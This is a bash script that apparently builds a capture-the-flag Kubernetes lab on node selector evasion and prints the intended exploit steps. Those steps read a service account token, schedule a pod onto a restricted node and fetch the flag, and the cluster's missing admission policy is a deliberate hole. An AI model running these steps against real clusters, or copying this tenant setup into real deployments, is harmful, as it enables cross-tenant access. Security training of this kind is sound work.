#!/bin/bash
set -euo pipefail
K8S_ID="k8s-28"
CLUSTER_NAME="cve-k8s-28-node-evasion"
source "$(dirname "$0")/../../scripts/k8s-common.sh"

echo "[K8S-28] Node Selector Evasion"
k8s_init
k8s_create_host_flag
k8s_create_cluster
k8s_wait_ready

echo "[*] Label worker nodes..."
WORKER_NODES=$(kubectl get nodes -l '!node-role.kubernetes.io/control-plane' -o name)
FIRST_WORKER=$(echo "$WORKER_NODES" | head -1)
kubectl label "$FIRST_WORKER" security=restricted --overwrite 2>/dev/null || true

k8s_load_images alpine:latest bitnami/kubectl:1.28

k8s_apply << 'YAML'
apiVersion: v1
kind: Namespace
metadata:
  name: secure-ns
---
apiVersion: v1
kind: Pod
metadata:
  name: flag-holder
  namespace: secure-ns
  labels:
    app: flag-holder
spec:
  nodeSelector:
    security: restricted
  containers:
    - name: server
      image: alpine:latest
      imagePullPolicy: IfNotPresent
      command: ["/bin/sh", "-c"]
      args:
        - "echo flag > /flag.txt && while true; do printf 'HTTP/1.1 200 OK\r\n\r\n%s' \"$(cat /flag.txt)\" | nc -l -p 8080 -w 1; done"
      ports:
        - containerPort: 8080
---
apiVersion: v1
kind: Service
metadata:
  name: flag-svc
  namespace: secure-ns
spec:
  selector:
    app: flag-holder
  ports:
    - port: 8080
---
# Tenant RBAC: attacker-sa can only manage pods inside attacker-ns
apiVersion: v1
kind: Namespace
metadata:
  name: attacker-ns
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: attacker-sa
  namespace: attacker-ns
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: attacker-pods
  namespace: attacker-ns
rules:
  - apiGroups: [""]
    resources: ["pods"]
    verbs: ["create", "get", "list", "update", "delete"]
  - apiGroups: [""]
    resources: ["pods/exec"]
    verbs: ["create"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: attacker-pods
  namespace: attacker-ns
subjects:
  - kind: ServiceAccount
    name: attacker-sa
    namespace: attacker-ns
roleRef:
  kind: Role
  name: attacker-pods
  apiGroup: rbac.authorization.k8s.io
---
apiVersion: v1
kind: Pod
metadata:
  name: attacker-pod
  namespace: attacker-ns
  labels:
    app: attacker
spec:
  serviceAccountName: attacker-sa
  containers:
    - name: attacker
      image: bitnami/kubectl:1.28
      imagePullPolicy: IfNotPresent
      command: ["sleep", "3600"]
YAML

k8s_wait_pod "flag-holder" "secure-ns"
k8s_wait_pod "attacker-pod" "attacker-ns"
sleep 5

FLAG_IP=$(kubectl get svc flag-svc -n secure-ns -o jsonpath='{.spec.clusterIP}')
kubectl exec -n secure-ns flag-holder -- sh -c "echo '$FLAG' > /flag.txt" 2>/dev/null || true

k8s_info
echo "    Flag in: flag-holder pod on restricted node"
echo "    Service: flag-svc.secure-ns.svc.cluster.local:8080"
echo ""
echo "    Exploit (attacker is a limited tenant in attacker-ns; use the SA token):"
echo "    TOKEN=\$(kubectl exec -n attacker-ns attacker-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token)"
echo "    kubectl --token=\$TOKEN get nodes --show-labels"
echo "    kubectl --token=\$TOKEN run evader --image=alpine -n attacker-ns --overrides='{\"spec\":{\"nodeSelector\":{\"security\":\"restricted\"}}}' -- sleep 3600"
echo "    kubectl --token=\$TOKEN exec evader -n attacker-ns -- wget -qO- http://${FLAG_IP}:8080"
echo ""
echo "    Note: nodeSelector is a scheduling hint, not a security boundary. The finding"
echo "    is the platform's missing admission policy (Gatekeeper/Kyverno/PSA) that"
echo "    would stop tenants from scheduling onto protected nodes."
